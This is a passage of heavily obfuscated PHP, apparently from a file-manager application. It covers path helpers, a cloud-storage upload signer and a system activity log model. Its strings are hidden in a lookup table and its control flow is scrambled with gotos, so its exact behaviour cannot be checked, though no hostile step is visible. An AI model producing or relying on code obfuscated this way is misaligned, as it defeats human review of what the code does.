!1, $F§È–ÎÒ∆°[76] => $B°’§¯æ∫›, $F§È–ÎÒ∆°[1074] => !1, $F§È–ÎÒ∆°[1073] => $F§È–ÎÒ∆°[33]); if (is_array($dìû¥Â»ë) && count($dìû¥Â»ë) == 5) { $EäÚ ‹Õæ´ = $F§È–ÎÒ∆°[1166] . $dìû¥Â»ë[2] . $F§È–ÎÒ∆°[325]; if (in_array($EäÚ ‹Õæ´, $F≥àõÓﬂ”ä)) { $c¥Õ˜èîÎ≤[$F§È–ÎÒ∆°[1074]] = $dìû¥Â»ë[1]; $c¥Õ˜èîÎ≤[$F§È–ÎÒ∆°[29]] = $EäÚ ‹Õæ´; $c¥Õ˜èîÎ≤[$F§È–ÎÒ∆°[1167]] = substr($EäÚ ‹Õæ´, 1, -1); $c¥Õ˜èîÎ≤[$F§È–ÎÒ∆°[394]] = $dìû¥Â»ë[3]; } $c¥Õ˜èîÎ≤[$F§È–ÎÒ∆°[1073]] = $dìû¥Â»ë[4]; } goto fïíÿ˜˜ÓÁ; dƒ€ÜÜ◊Çè: } public static function isTruePath($aê∏‡âÎèŸ) { goto b≤µˆ≥å¯≥; dÔ’íÜÖÉö: if (strpos($aê∏‡âÎèŸ, $eÑ›∑ØáÖÖ[1170]) === 0) { return !0; } return !1; goto F¯„¶πæ∞î; b≤µˆ≥å¯≥: $eÑ›∑ØáÖÖ =& $_SERVER[Öíæ€“”≠éÏË]; if (substr($aê∏‡âÎèŸ, 0, 1) != $eÑ›∑ØáÖÖ[1166]) { return !0; } if (strpos($aê∏‡âÎèŸ, $eÑ›∑ØáÖÖ[402]) === 0) { return !0; } goto D™¡ÕèçË; D™¡ÕèçË: if (strpos($aê∏‡âÎèŸ, $eÑ›∑ØáÖÖ[1133]) === 0) { return !0; } if (strpos($aê∏‡âÎèŸ, $eÑ›∑ØáÖÖ[1168]) === 0) { return !0; } if (strpos($aê∏‡âÎèŸ, $eÑ›∑ØáÖÖ[1169]) === 0) { return !0; } goto dÔ’íÜÖÉö; F¯„¶πæ∞î: } public static function clear($FÀÆÇ’«ı˘) { goto bŒÙ≠à Ë¯; Aâå•ÿÎÑò: return $FÀÆÇ’«ı˘; goto B∑ù‚ˆ£É‚; bŒÙ≠à Ë¯: $FÔé–ˆÒ«¶ =& $_SERVER[Öíæ€“”≠éÏË]; $FÀÆÇ’«ı˘ = str_replace(array($FÔé–ˆÒ«¶[1047], $FÔé–ˆÒ«¶[229]), $FÔé–ˆÒ«¶[50], $FÀÆÇ’«ı˘); $FÀÆÇ’«ı˘ = str_replace($FÔé–ˆÒ«¶[97], $FÔé–ˆÒ«¶[8], $FÀÆÇ’«ı˘); goto dŒÓÊâ¡ØÀ; FàÊÕ€’⁄¡: $FÀÆÇ’«ı˘ = preg_replace($FÔé–ˆÒ«¶[1173], $FÔé–ˆÒ«¶[8], $FÀÆÇ’«ı˘); if ($FÀÆÇ’«ı˘ == $FÔé–ˆÒ«¶[8]) { return $FÔé–ˆÒ«¶[8]; } $FÀÆÇ’«ı˘ = rtrim($FÀÆÇ’«ı˘, $FÔé–ˆÒ«¶[8]); goto Aâå•ÿÎÑò; dŒÓÊâ¡ØÀ: $a√‘óá„≠© = $FÔé–ˆÒ«¶[1171]; if (substr($FÀÆÇ’«ı˘, 0, 3) == $FÔé–ˆÒ«¶[1172]) { $FÀÆÇ’«ı˘ = substr($FÀÆÇ’«ı˘, 3); } while (strstr($FÀÆÇ’«ı˘, $a√‘óá„≠©)) { $FÀÆÇ’«ı˘ = str_replace($a√‘óá„≠©, $FÔé–ˆÒ«¶[8], $FÀÆÇ’«ı˘); } goto FàÊÕ€’⁄¡; B∑ù‚ˆ£É‚: } public static function sourceID($dçÈ”±Ÿı‘) { $Cµ£ÿ◊∏õÎ =& $_SERVER[Öíæ€“”≠éÏË]; $cøæé©†∂ê = self::parse($dçÈ”±Ÿı‘); if ($cøæé©†∂ê[$Cµ£ÿ◊∏õÎ[29]] !== self::KOD_SOURCE) { show_json(LNG($Cµ£ÿ◊∏õÎ[1174]), !1); } return $cøæé©†∂ê[$Cµ£ÿ◊∏õÎ[394]]; } public static function make($f⁄ø±Õàèπ) { if (!$f⁄ø±Õàèπ) { return !1; } return self::makePath(self::KOD_SOURCE, intval($f⁄ø±Õàèπ)); } public static function makeShare($C–≈ëø¬∑ò, $Aß«âÊåØç) { return self::makePath(self::KOD_SHARE_ITEM, $C–≈ëø¬∑ò, $Aß«âÊåØç); } public static function makeFileTypePath($A€›Ü‘íä∆) { return self::makePath(self::KOD_USER_FILE_TYPE, $A€›Ü‘íä∆); } public static function makeFileTagPath($dÖÒÜø†◊◊) { return self::makePath(self::KOD_USER_FILE_TAG, $dÖÒÜø†◊◊); } public static function makePath($cËÎßÂΩ¡Ø, $CóÛºÿ◊êï = '', $F‰õ€åÂ⁄Ø = '') { $f±î¨ÀàóÚ =& $_SERVER[Öíæ€“”≠éÏË]; $fÎèËÁ˘óÍ = substr($cËÎßÂΩ¡Ø, 1, -1); $fµﬁ∏Ïäºà = $f±î¨ÀàóÚ[1175] . $fÎèËÁ˘óÍ . $f±î¨ÀàóÚ[1176] . $CóÛºÿ◊êï . $f±î¨ÀàóÚ[1177]; $fµﬁ∏Ïäºà = $F‰õ€åÂ⁄Ø ? $fµﬁ∏Ïäºà . $F‰õ€åÂ⁄Ø . $f±î¨ÀàóÚ[8] : $fµﬁ∏Ïäºà; return $fµﬁ∏Ïäºà; } public static function hashPath($föﬁﬁâÎÍ‚, $C÷Ô°·¿úî = true) { goto aéËú° §; DŸëπó≤Ú÷: return $D∞‹∞©üÍÚ; goto A˜ãÜîﬂı‰; aéËú° §: $bâæÔÍ§´ù =& $_SERVER[Öíæ€“”≠éÏË]; $fãÆ·—üå≥ = is_array($föﬁﬁâÎÍ‚) ? $föﬁﬁâÎÍ‚ : IO::info($föﬁﬁâÎÍ‚); $D∞‹∞©üÍÚ = _get($fãÆ·—üå≥, $bâæÔÍ§´ù[1178], $bâæÔÍ§´ù[33]); goto C®´›“¿è¿; C®´›“¿è¿: if (!$D∞‹∞©üÍÚ && isset($fãÆ·—üå≥[$bâæÔÍ§´ù[396]])) { $fãÆ·—üå≥ = IO::info(KodIO::make($fãÆ·—üå≥[$bâæÔÍ§´ù[396]])); $D∞‹∞©üÍÚ = _get($fãÆ·—üå≥, $bâæÔÍ§´ù[1178], $bâæÔÍ§´ù[33]); } if (!$D∞‹∞©üÍÚ && $C÷Ô°·¿úî) { $aøêÇ™¯´º = KodIO::parse($fãÆ·—üå≥[$bâæÔÍ§´ù[76]]); if (!$aøêÇ™¯´º[$bâæÔÍ§´ù[29]]) { $D∞‹∞©üÍÚ = IO::hashSimple($fãÆ·—üå≥[$bâæÔÍ§´ù[76]]); } } if (!$D∞‹∞©üÍÚ) { $D∞‹∞©üÍÚ = md5($fãÆ·—üå≥[$bâæÔÍ§´ù[76]] . $fãÆ·—üå≥[$bâæÔÍ§´ù[78]] . $fãÆ·—üå≥[$bâæÔÍ§´ù[84]]); } goto DŸëπó≤Ú÷; A˜ãÜîﬂı‰: } public static function initSystemPath() { goto FŸæ–∏Àòœ; FŸæ–∏Àòœ: $BÎ«∫≤∫ÁÖ =& $_SERVER[Öíæ€“”≠éÏË]; if (defined($BÎ«∫≤∫ÁÖ[1179])) { return; } define($BÎ«∫≤∫ÁÖ[1179], self::systemPath($BÎ«∫≤∫ÁÖ[1180])); goto a∑∏ û´°õ; cÛÒÏ¨í‡ç: IOHistory::bindEvent(); goto CﬁõïºƒãÉ; a∑∏ û´°õ: define($BÎ«∫≤∫ÁÖ[1181], self::systemPath($BÎ«∫≤∫ÁÖ[1182])); define($BÎ«∫≤∫ÁÖ[1183], self::systemPath($BÎ«∫≤∫ÁÖ[1184])); define($BÎ«∫≤∫ÁÖ[1185], self::systemPath($BÎ«∫≤∫ÁÖ[1186])); goto cÛÒÏ¨í‡ç; CﬁõïºƒãÉ: } public static function systemPath($fÒ´∆Ô÷Ùù) { goto aµàƒ«˜à ; a†ÿëãóª≈: if ($EÍá«ø⁄Ù¿) { return $EÍá«ø⁄Ù¿; } if ($fÒ´∆Ô÷Ùù == $Dﬂíã‹¨É∫[1180]) { $EÍá«ø⁄Ù¿ = self::make(Model($Dﬂíã‹¨É∫[803])->systemRootPathAdd($Dﬂíã‹¨É∫[519])); } else { $EÍá«ø⁄Ù¿ = self::systemPath($Dﬂíã‹¨É∫[1180]); $Eå≤πóíúã = self::sourceID($EÍá«ø⁄Ù¿); $EÍá«ø⁄Ù¿ = self::make(Model($Dﬂíã‹¨É∫[803])->mkdir($Eå≤πóíúã, $fÒ´∆Ô÷Ùù)); } Model($Dﬂíã‹¨É∫[743])->set($fêÜ„Ö®§, $EÍá«ø⁄Ù¿); goto E⁄Â¶äó‚Â; aµàƒ«˜à : $Dﬂíã‹¨É∫ =& $_SERVER[Öíæ€“”≠éÏË]; $fêÜ„Ö®§ = $Dﬂíã‹¨É∫[1187] . ucfirst($fÒ´∆Ô÷Ùù); $EÍá«ø⁄Ù¿ = Model($Dﬂíã‹¨É∫[743])->get($fêÜ„Ö®§); goto a†ÿëãóª≈; E⁄Â¶äó‚Â: return $EÍá«ø⁄Ù¿; goto D€ºËÊ√∫¶; D€ºËÊ√∫¶: } public static function systemFolder($cÒã‹ø¶∫±) { $bÂŸ“ÒµÈ∏ = IO_PATH_SYSTEM_SOURCE . $cÒã‹ø¶∫±; $Eèºø‘ÀÊÜ = Cache::get($bÂŸ“ÒµÈ∏); if (!$Eèºø‘ÀÊÜ) { $CóÔº€◊´ö = IO::infoFull($bÂŸ“ÒµÈ∏); if (!$CóÔº€◊´ö) { $Eèºø‘ÀÊÜ = IO::mkdir($bÂŸ“ÒµÈ∏, REPEAT_SKIP); } else { $Eèºø‘ÀÊÜ = $CóÔº€◊´ö[$_SERVER[Öíæ€“”≠éÏË][76]]; } Cache::set($bÂŸ“ÒµÈ∏, $Eèºø‘ÀÊÜ, 3600 * 10); } return $Eèºø‘ÀÊÜ; } public static function defaultDriver() { return Model($_SERVER[Öíæ€“”≠éÏË][740])->defaultDriver(); } public static function defaultIO() { $Aæ⁄ÚòòÕ∞ =& $_SERVER[Öíæ€“”≠éÏË]; $bãæ„‡ÙÆñ = self::defaultDriver(); return $Aæ⁄ÚòòÕ∞[1188] . $bãæ„‡ÙÆñ[$Aæ⁄ÚòòÕ∞[394]] . $Aæ⁄ÚòòÕ∞[1177]; } public static function defaultDriverInit() { static $E∏ìñ€üÉΩ = false; if ($E∏ìñ€üÉΩ) { return $E∏ìñ€üÉΩ; } $E∏ìñ€üÉΩ = IO::init(self::defaultIO()); return $E∏ìñ€üÉΩ; } public static function fileTypeList() { $aΩ≈∆ãŸ‡∆ =& $_SERVER[Öíæ€“”≠éÏË]; $eÔÆÒ»ﬁ¿ï = $GLOBALS[$aΩ≈∆ãŸ‡∆[6]][$aΩ≈∆ãŸ‡∆[1189]]; foreach ($eÔÆÒ»ﬁ¿ï as $dÇ€ö¬Ÿ„ => $D‰¬•Ö·«≥) { $cœ≤©Í°¥Ë = $aΩ≈∆ãŸ‡∆[1190] . $dÇ€ö¬Ÿ„; $dù‰∏éﬂ§Û = LNG($cœ≤©Í°¥Ë); if ($cœ≤©Í°¥Ë != $dù‰∏éﬂ§Û) { $eÔÆÒ»ﬁ¿ï[$dÇ€ö¬Ÿ„][$aΩ≈∆ãŸ‡∆[28]] = $dù‰∏éﬂ§Û; } } return $eÔÆÒ»ﬁ¿ï; } public static function transferType($aå¿íÇ´è´, $B¬®õÛâÒÔ) { goto AÍÜƒØƒ≈‘; f√ãíêÜ≤Ü: if ($C‘◊∞∞¥¬Œ[$b´æá◊ó÷á[29]] == $c¢Ëƒ∏ø¬ê[$b´æá◊ó÷á[29]] && $C‘◊∞∞¥¬Œ[$b´æá◊ó÷á[1191]] == $c¢Ëƒ∏ø¬ê[$b´æá◊ó÷á[1191]]) { return $b´æá◊ó÷á[1192]; } if ($C‘◊∞∞¥¬Œ[$b´æá◊ó÷á[29]] == $b´æá◊ó÷á[836] && $c¢Ëƒ∏ø¬ê[$b´æá◊ó÷á[29]] == $b´æá◊ó÷á[106]) { return $b´æá◊ó÷á[1103]; } if ($C‘◊∞∞¥¬Œ[$b´æá◊ó÷á[29]] == $b´æá◊ó÷á[106] && $c¢Ëƒ∏ø¬ê[$b´æá◊ó÷á[29]] == $b´æá◊ó÷á[836]) { return $b´æá◊ó÷á[107]; } goto AÉ÷⁄®æ™Ô; AÉ÷⁄®æ™Ô: return $b´æá◊ó÷á[1193]; goto bô∑ﬁ†ÇÂí; AÍÜƒØƒ≈‘: $b´æá◊ó÷á =& $_SERVER[Öíæ€“”≠éÏË]; $C‘◊∞∞¥¬Œ = self::driverType($aå¿íÇ´è´); $c¢Ëƒ∏ø¬ê = self::driverType($B¬®õÛâÒÔ); goto f√ãíêÜ≤Ü; bô∑ﬁ†ÇÂí: } public static function driverType($Fî±ÓÎò©„) { goto e……åÎöìª; e……åÎöìª: $dòë›Â∆í¥ =& $_SERVER[Öíæ€“”≠éÏË]; $fÂ±≤π÷Èœ = $Fî±ÓÎò©„->path; $DÈÒ≤µ…Øù = str_replace($dòë›Â∆í¥[1194], $dòë›Â∆í¥[33], strtolower($Fî±ÓÎò©„->getType())); goto f¶ç’çÛÓ≤; eìûˆ¬ÃÚ: return array($dòë›Â∆í¥[29] => $dòë›Â∆í¥[836], $dòë›Â∆í¥[1191] => $Fî±ÓÎò©„->pathDriver, $dòë›Â∆í¥[76] => $fÂ±≤π÷Èœ); goto DÜÉÈˆ÷†¢; f¶ç’çÛÓ≤: if ($DÈÒ≤µ…Øù == $dòë›Â∆í¥[731] || $DÈÒ≤µ…Øù == $dòë›Â∆í¥[1195] || $DÈÒ≤µ…Øù == $dòë›Â∆í¥[1196]) { $Fî±ÓÎò©„ = self::defaultDriverInit(); } else { if ($DÈÒ≤µ…Øù == $dòë›Â∆í¥[1110] || $DÈÒ≤µ…Øù == $dòë›Â∆í¥[1197]) { $Fî±ÓÎò©„ = IO::init($Fî±ÓÎò©„->pathParse[$dòë›Â∆í¥[1057]]); } } $DÈÒ≤µ…Øù = str_replace($dòë›Â∆í¥[1194], $dòë›Â∆í¥[33], strtolower($Fî±ÓÎò©„->getType())); if ($DÈÒ≤µ…Øù == $dòë›Â∆í¥[106]) { return array($dòë›Â∆í¥[29] => $dòë›Â∆í¥[106], $dòë›Â∆í¥[1191] => $dòë›Â∆í¥[33], $dòë›Â∆í¥[76] => $fÂ±≤π÷Èœ); } goto eìûˆ¬ÃÚ; DÜÉÈˆ÷†¢: } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($aü éËä®‚) { parent::__construct($aü éËä®‚); $this->signatureVersion($_SERVER[Öíæ€“”≠éÏË][212]); } public function uploadFormData($c™¶Í√ùäó, $dÓéè◊©∆¿ = 3600) { goto eÇ‚êºÚç±; füüπ§†ë…: return $fëÓ€¬›ÊÛ; goto Eˆñ˘Ò¡ºª; D√öÌ≈éËÀ: $C≠ÛÇ®ïÂÆ = $Cëä√≠™€Û[1198]; $AÈ—ﬂËŸ©Ú = gmdate($Cëä√≠™€Û[1199], time() + $dÓéè◊©∆¿); $Dâ∞ºÌâÇá = (string) time() . $Cëä√≠™€Û[68] . (string) (time() + $dÓéè◊©∆¿); goto F¿®◊ƒ£ß’; eÇ‚êºÚç±: $Cëä√≠™€Û =& $_SERVER[Öíæ€“”≠éÏË]; $e©œ¿≠§»ø = $Cëä√≠™€Û[192]; $BèﬁëàÆËê = $Cëä√≠™€Û[230]; goto D√öÌ≈éËÀ; F¿®◊ƒ£ß’: $F¢úÛ¶°ª¥ = array($Cëä√≠™€Û[1200] => $AÈ—ﬂËŸ©Ú, $Cëä√≠™€Û[1201] => array(array($Cëä√≠™€Û[1202] => $e©œ¿≠§»ø), array($Cëä√≠™€Û[1203] => $this->bucket), array($Cëä√≠™€Û[1204], $Cëä√≠™€Û[1205], $Cëä√≠™€Û[33]), array($Cëä√≠™€Û[1206] => $C≠ÛÇ®ïÂÆ), array($Cëä√≠™€Û[1207] => $BèﬁëàÆËê), array($Cëä√≠™€Û[1208] => $this->accessKey), array($Cëä√≠™€Û[1209] => $Dâ∞ºÌâÇá))); $F¢úÛ¶°ª¥ = json_encode($F¢úÛ¶°ª¥); $dÿŒµÒΩ…† = hash_hmac($Cëä√≠™€Û[230], $Dâ∞ºÌâÇá, $this->secret); goto CÎÉ‚ƒŒë»; CÎÉ‚ƒŒë»: $F¡¡ëï¬ç… = sha1($F¢úÛ¶°ª¥); $Fﬂ›ø∫›∫” = hash_hmac($Cëä√≠™€Û[230], $F¡¡ëï¬ç…, $dÿŒµÒΩ…†); $fëÓ€¬›ÊÛ = array($Cëä√≠™€Û[1202] => $e©œ¿≠§»ø, $Cëä√≠™€Û[1206] => $C≠ÛÇ®ïÂÆ, $Cëä√≠™€Û[1210] => base64_encode($F¢úÛ¶°ª¥), $Cëä√≠™€Û[1207] => $BèﬁëàÆËê, $Cëä√≠™€Û[1208] => $this->accessKey, $Cëä√≠™€Û[1211] => $Dâ∞ºÌâÇá, $Cëä√≠™€Û[1212] => $Fﬂ›ø∫›∫”, $Cëä√≠™€Û[175] => $this->getHost()); goto füüπ§†ë…; Eˆñ˘Ò¡ºª: } public function fileOutLink($BÊïÜ∂õü¨) { $a¬ÚÔàñπÎ =& $_SERVER[Öíæ€“”≠éÏË]; if (substr($BÊïÜ∂õü¨, 0, 7) == $a¬ÚÔàñπÎ[1213]) { $BÊïÜ∂õü¨ = $a¬ÚÔàñπÎ[1214] . substr($BÊïÜ∂õü¨, 7); } header($a¬ÚÔàñπÎ[159] . $BÊïÜ∂õü¨); die; } } goto c¯∞ûï€úù; aìΩ‡œÑÙî: class SystemLogModel extends ModelBase { protected $tableName = "\163\171\163\x74\x65\155\137\x6c\x6f\147"; protected $dataAuto = array(array("\143\162\x65\x61\x74\x65\x54\151\x6d\x65", "\164\151\155\x65", "\x69\x6e\163\145\162\x74", "\146\165\x6e\143\164\151\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $bñ©€Ôì«à =& $_SERVER[Öíæ€“”≠éÏË]; return array($bñ©€Ôì«à[2023] => LNG($bñ©€Ôì«à[2024]), $bñ©€Ôì«à[2025] => LNG($bñ©€Ôì«à[2026]), $bñ©€Ôì«à[1647] => LNG($bñ©€Ôì«à[2027]), $bñ©€Ôì«à[2028] => LNG($bñ©€Ôì«à[2029]), $bñ©€Ôì«à[2030] => LNG($bñ©€Ôì«à[2031]), $bñ©€Ôì«à[2032] => LNG($bñ©€Ôì«à[2033]), $bñ©€Ôì«à[2034] => LNG($bñ©€Ôì«à[2035]), $bñ©€Ôì«à[1677] => LNG($bñ©€Ôì«à[2035]), $bñ©€Ôì«à[1678] => LNG($bñ©€Ôì«à[2036]), $bñ©€Ôì«à[2037] => LNG($bñ©€Ôì«à[2038]), $bñ©€Ôì«à[2039] => LNG($bñ©€Ôì«à[2040]), $bñ©€Ôì«à[2041] => LNG($bñ©€Ôì«à[2042]), $bñ©€Ôì«à[2043] => LNG($bñ©€Ôì«à[2044]), $bñ©€Ôì«à[1675] => LNG($bñ©€Ôì«à[2045]), $bñ©€Ôì«à[2046] => LNG($bñ©€Ôì«à[2047]), $bñ©€Ôì«à[1682] => LNG($bñ©€Ôì«à[2048]), $bñ©€Ôì«à[2049] => LNG($bñ©€Ôì«à[2050]), $bñ©€Ôì«à[2051] => LNG($bñ©€Ôì«à[2052]), $bñ©€Ôì«à[2053] => LNG($bñ©€Ôì«à[2054]), $bñ©€Ôì«à[2055] => LNG($bñ©€Ôì«à[2056]), $bñ©€Ôì«à[1685] => LNG($bñ©€Ôì«à[2057]), $bñ©€Ôì«à[1686] => LNG($bñ©€Ôì«à[2058]), $bñ©€Ôì«à[2059] => LNG($bñ©€Ôì«à[2060]), $bñ©€Ôì«à[2061] => LNG($bñ©€Ôì«à[2062]), $bñ©€Ôì«à[2063] => LNG($bñ©€Ôì«à[2064]), $bñ©€Ôì«à[1680] => LNG($bñ©€Ôì«à[2065]), $bñ©€Ôì«à[2066] => LNG($bñ©€Ôì«à[2067]), $bñ©€Ôì«à[1679] => LNG($bñ©€Ôì«à[2068]), $bñ©€Ôì«à[2069] => LNG($bñ©€Ôì«à[2070]), $bñ©€Ôì«à[2071] => LNG($bñ©€Ôì«à[2072]), $bñ©€Ôì«à[2073] => LNG($bñ©€Ôì«à[2074]), $bñ©€Ôì«à[2075] => LNG($bñ©€Ôì«à[2075]), $bñ©€Ôì«à[2076] => LNG($bñ©€Ôì«à[1651]), $bñ©€Ôì«à[2077] => LNG($bñ©€Ôì«à[2078]), $bñ©€Ôì«à[2079] => LNG($bñ©€Ôì«à[2080]), $bñ©€Ôì«à[2081] => LNG($bñ©€Ôì«à[2082]), $bñ©€Ôì«à[2083] => LNG($bñ©€Ôì«à[2084]), $bñ©€Ôì«à[2085] => LNG($bñ©€Ôì«à[2086]), $bñ©€Ôì«à[2087] => LNG($bñ©€Ôì«à[2087]), $bñ©€Ôì«à[2088] => LNG($bñ©€Ôì«à[2089]), $bñ©€Ôì«à[2090] => LNG($bñ©€Ôì«à[2091]), $bñ©€Ôì«à[2092] => LNG($bñ©€Ôì«à[2093]), $bñ©€Ôì«à[2094] => LNG($bñ©€Ôì«à[2095]), $bñ©€Ôì«à[2096] => LNG($bñ©€Ôì«à[2097]), $bñ©€Ôì«à[2098] => LNG($bñ©€Ôì«à[2099])); } private function typeFile() { $f¶É∞‡µÂñ =& $_SERVER[Öíæ€“”≠éÏË]; $e‡÷Âò∏ëç = array($f¶É∞‡µÂñ[1682] => array($f¶É∞‡µÂñ[1683]), $f¶É∞‡µÂñ[2041] => array($f¶É∞‡µÂñ[2100]), $f¶É∞‡µÂñ[2043] => array($f¶É∞‡µÂñ[2101]), $f¶É∞‡µÂñ[1675] => array($f¶É∞‡µÂñ[1676]), $f¶É∞‡µÂñ[2051] => array(), $f¶É∞‡µÂñ[2053] => array(), $f¶É∞‡µÂñ[2055] => array(), $f¶É∞‡µÂñ[1685] => array($f¶É∞‡µÂñ[1687]), $f¶É∞‡µÂñ[1686] => array($f¶É∞‡µÂñ[1687]), $f¶É∞‡µÂñ[2059] => array($f¶É∞‡µÂñ[2102]), $f¶É∞‡µÂñ[2061] => array($f¶É∞‡µÂñ[2102]), $f¶É∞‡µÂñ[2063] => array($f¶É∞‡µÂñ[2103]), $f¶É∞‡µÂñ[2049] => array($f¶É∞‡µÂñ[2104]), $f¶É∞‡µÂñ[1680] => array($f¶É∞‡µÂñ[2105]), $f¶É∞‡µÂñ[2066] => array($f¶É∞‡µÂñ[2106]), $f¶É∞‡µÂñ[1679] => array($f¶É∞‡µÂñ[1681])); return $e‡÷Âò∏ëç; } private function typeAll() { goto b≈˘îß‰¢í; b≈˘îß‰¢í: $Dƒåπƒ®≈∞ =& $_SERVER[Öíæ€“”≠éÏË]; $dç—£ç¨ˆÇ = $this->typeList; $aπì≈çˆóÃ = array_filter($this->typeFile()); goto f¬Úπ›•ƒ€; eÆÁà∂£ôﬁ: return $dç—£ç¨ˆÇ; goto a©£∏ë¿»ˆ; f¬Úπ›•ƒ€: foreach ($aπì≈çˆóÃ as $B∑í•…Ãı€ => $B‚∞¶àÓáú) { $dç—£ç¨ˆÇ[$B‚∞¶àÓáú[0]] = $dç—£ç¨ˆÇ[$B∑í•…Ãı€]; } $dç—£ç¨ˆÇ[$Dƒåπƒ®≈∞[1687]] = LNG($Dƒåπƒ®≈∞[2107]); $dç—£ç¨ˆÇ[$Dƒåπƒ®≈∞[2102]] = LNG($Dƒåπƒ®≈∞[2108]); goto eÆÁà∂£ôﬁ; a©£∏ë¿»ˆ: } public function addLog($Cƒï∑≈€⁄Â, $D¯Íè∞Ï∫© = array()) { goto cﬂªïÙ†»„; cﬂªïÙ†»„: $Bèèä¨ä‹ı =& $_SERVER[Öíæ€“”≠éÏË]; if (!isset($this->typeList[$Cƒï∑≈€⁄Â])) { return; } $bÜÀ≠⁄‰Ìã = defined($Bèèä¨ä‹ı[455]) && USER_ID ? USER_ID : (isset($D¯Íè∞Ï∫©[$Bèèä¨ä‹ı[1538]]) ? $D¯Íè∞Ï∫©[$Bèèä¨ä‹ı[1538]] : 0); goto FË¯•õ€¯‰; FË¯•õ€¯‰: if (!$bÜÀ≠⁄‰Ìã) { $bÜÀ≠⁄‰Ìã = (int) Session::get($Bèèä¨ä‹ı[1838]); } $bñö†õÏ˜√ = get_client_ip(); if (!$D¯Íè∞Ï∫© || strlen(json_encode($D¯Íè∞Ï∫©)) >= 1024) { $D¯Íè∞Ï∫© = array($Bèèä¨ä‹ı[2109] => $bñö†õÏ˜√); } else { if (is_array($D¯Íè∞Ï∫©)) { $D¯Íè∞Ï∫©[$Bèèä¨ä‹ı[2109]] = $bñö†õÏ˜√; } else { $D¯Íè∞Ï∫© = array($Bèèä¨ä‹ı[1097] => $D¯Íè∞Ï∫©, $Bèèä¨ä‹ı[2109] => $bñö†õÏ˜√); } } goto a≈øïß∫Á√; a≈øïß∫Á√: $D¯Íè∞Ï∫© = array($Bèèä¨ä‹ı[1528] => Session::sign(), $Bèèä¨ä‹ı[1529] => $bÜÀ≠⁄‰Ìã, $Bèèä¨ä‹ı[29] => $Cƒï∑≈€⁄Â, $Bèèä¨ä‹ı[1531] => json_encode($D¯Íè∞Ï∫©)); parent::add($D¯Íè∞Ï∫©); goto dªüêŸŸ…µ; dªüêŸŸ…µ: } public function remove($d…¿ıÖí•æ) { $this->where(array($_SERVER[Öíæ€“”≠éÏË][413] => $d…¿ıÖí•æ))->delete(); } private function _makeOrder($eÏ†√ó•≥ì = '') { goto dû◊ºïª¬Ò; D·Üƒ®é·◊: return $this->order($eÏ†√ó•≥ì); goto fÍ⁄òößî€; dû◊ºïª¬Ò: $e‹ÇÜÖ¯¢⁄ =& $_SERVER[Öíæ€“”≠éÏË]; $f◊’‘Ó‡÷ã = $e‹ÇÜÖ¯¢⁄[194]; $C®Œ≥à®âï = array($e‹ÇÜÖ¯¢⁄[429] => $e‹ÇÜÖ¯¢⁄[430], $e‹ÇÜÖ¯¢⁄[431] => $e‹ÇÜÖ¯¢⁄[432]); goto FÍ˘êÛƒòª; FÍ˘êÛƒòª: $Bè“ûπññò = Input::get($e‹ÇÜÖ¯¢⁄[437], $e‹ÇÜÖ¯¢⁄[7], $e‹ÇÜÖ¯¢⁄[1870], array($e‹ÇÜÖ¯¢⁄[1794], $e‹ÇÜÖ¯¢⁄[431])); $Bè“ûπññò = $C®Œ≥à®âï[$Bè“ûπññò]; $eÏ†√ó•≥ì = $eÏ†√ó•≥ì . "{$f◊’‘Ó‡÷ã}\x20{$Bè“ûπññò}"; goto D·Üƒ®é·◊; fÍ⁄òößî€: } public function get($Fá ¥ﬂÎ£å = '') { goto c∆≠°≥ç˘Ñ; bÓñ÷¬Ω¿…: if (!empty($Fá ¥ﬂÎ£å[$d¯ÊáøÉÉÃ[2109]])) { $d√„ÿÊåŸ¶[$d¯ÊáøÉÉÃ[432]] = array($d¯ÊáøÉÉÃ[380], "\x25{$Fá ¥ﬂÎ£å[$d¯ÊáøÉÉÃ[2109]]}\x25"); } $b∂ÿãØ˘ıã = $this->_makeOrder()->where($d√„ÿÊåŸ¶)->selectPage(); if (empty($b∂ÿãØ˘ıã[$d¯ÊáøÉÉÃ[367]])) { show_json(array(), !0, $b∂ÿãØ˘ıã[$d¯ÊáøÉÉÃ[364]]); } goto EÁ⁄Éà´¶è; EÁ⁄Éà´¶è: $b∂ÿãØ˘ıã[$d¯ÊáøÉÉÃ[367]] = $this->logList($b∂ÿãØ˘ıã[$d¯ÊáøÉÉÃ[367]]); return $b∂ÿãØ˘ıã; goto e´îÃÌ°ÃË; c∆≠°≥ç˘Ñ: $d¯ÊáøÉÉÃ =& $_SERVER[Öíæ€“”≠éÏË]; if (!$Fá ¥ﬂÎ£å) { show_json(array()); } $d√„ÿÊåŸ¶ = array(); goto bó“É’·¯¢; bó“É’·¯¢: if ($Fá ¥ﬂÎ£å[$d¯ÊáøÉÉÃ[1538]]) { $d√„ÿÊåŸ¶[$d¯ÊáøÉÉÃ[1538]] = $Fá ¥ﬂÎ£å[$d¯ÊáøÉÉÃ[1538]]; } if (isset($Fá ¥ﬂÎ£å[$d¯ÊáøÉÉÃ[734]])) { $aº…ë™ÜåÈ = $Fá ¥ﬂÎ£å[$d¯ÊáøÉÉÃ[734]]; $eŸì˘õ°∂∆ = isset($Fá ¥ﬂÎ£å[$d¯ÊáøÉÉÃ[477]]) ? $Fá ¥ﬂÎ£å[$d¯ÊáøÉÉÃ[477]] : time(); $d√„ÿÊåŸ¶[$d¯ÊáøÉÉÃ[194]] = array($d¯ÊáøÉÉÃ[331], array($aº…ë™ÜåÈ, $eŸì˘õ°∂∆)); } if ($Fá ¥ﬂÎ£å[$d¯ÊáøÉÉÃ[29]]) { $aÔÈ›è‰ã¢ = explode($d¯ÊáøÉÉÃ[47], $Fá ¥ﬂÎ£å[$d¯ÊáøÉÉÃ[29]]); $C∞¿Ë„’æ… = $this->typeFile(); $c“·§´Ù∆∫ = array(); foreach ($aÔÈ›è‰ã¢ as $aáÒ©ëé¯ñ) { $c“·§´Ù∆∫[] = $aáÒ©ëé¯ñ; if (isset($C∞¿Ë„’æ…[$aáÒ©ëé¯ñ])) { $c“·§´Ù∆∫ = array_merge($c“·§´Ù∆∫, $C∞¿Ë„’æ…[$aáÒ©ëé¯ñ]); } } $c“·§´Ù∆∫ = array_unique($c“·§´Ù∆∫); if ($c“·§´Ù∆∫) { $d√„ÿÊåŸ¶[$d¯ÊáøÉÉÃ[29]] = array($d¯ÊáøÉÉÃ[7], $c“·§´Ù∆∫); } 